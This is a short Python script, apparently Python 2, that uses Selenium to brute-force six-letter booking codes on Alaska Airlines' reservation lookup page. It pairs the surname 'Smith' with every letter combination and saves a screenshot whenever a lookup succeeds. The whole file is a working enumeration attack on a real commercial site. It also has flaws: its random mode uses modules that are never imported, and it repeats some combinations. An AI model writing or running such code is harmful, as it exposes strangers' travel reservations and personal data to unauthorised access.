import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

def letter(i):

    if i == 0:
        return 'A'
    elif i == 1:
        return 'B'
    elif i == 2:
        return 'C'
    elif i == 3:
        return 'D'
    elif i == 4:
        return 'E'
    elif i == 5:
        return 'F'
    elif i == 6:
        return 'G'
    elif i == 7:
        return 'H'
    elif i == 8:
        return 'I'
    elif i == 9:
        return 'J'
    elif i == 10:
        return 'K'
    elif i == 11:
        return 'L'
    elif i == 12:
        return 'M'
    elif i == 13:
        return 'N'
    elif i == 14:
        return 'O'
    elif i == 15:
        return 'P'
    elif i == 16:
        return 'Q'
    elif i == 17:
        return 'R'
    elif i == 18:
        return 'S'
    elif i == 19:
        return 'T'
    elif i == 20:
        return 'U'
    elif i == 21:
        return 'V'
    elif i == 22:
        return 'W'
    elif i == 23:
        return 'X'
    elif i == 24:
        return 'Y'
    elif i == 25:
        return 'Z'
    else:
        return 'Z'

def tryPNR(arg):
    name_field = driver.find_element_by_css_selector('#TravelerLastName')
    search_field = driver.find_element_by_css_selector('#CodeOrNumber')
    name_field.clear()
    search_field.clear()
    name_field.send_keys("Smith")
    search_field.send_keys(arg)
    search_field.submit()
    source= driver.page_source.encode('utf-8')
    source = str(source)

    if "The information entered does not match a reservation in our records. Please try again or enter your e-ticket number." in source:
      print arg
      return
    else:
      driver.save_screenshot('screen.png')
      print arg

def brutForce():

    for i in range(27):
        for j in range(27):
            for k in range(27):
                for l in range(27):
                    for m in range(27):
                        for n in range(27):
                           tryPNR(letter(i)+letter(j)+letter(k)+letter(l)+letter(m)+letter(n))

def randomForce():
    randomString = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
    tryPNR(randomString)

driver = webdriver.Chrome()
driver.implicitly_wait(5)
driver.get("https://www.alaskaair.com/booking/reservationlookup")
name_field = driver.find_element_by_css_selector('#TravelerLastName')
search_field = driver.find_element_by_css_selector('#CodeOrNumber')
brutForce()
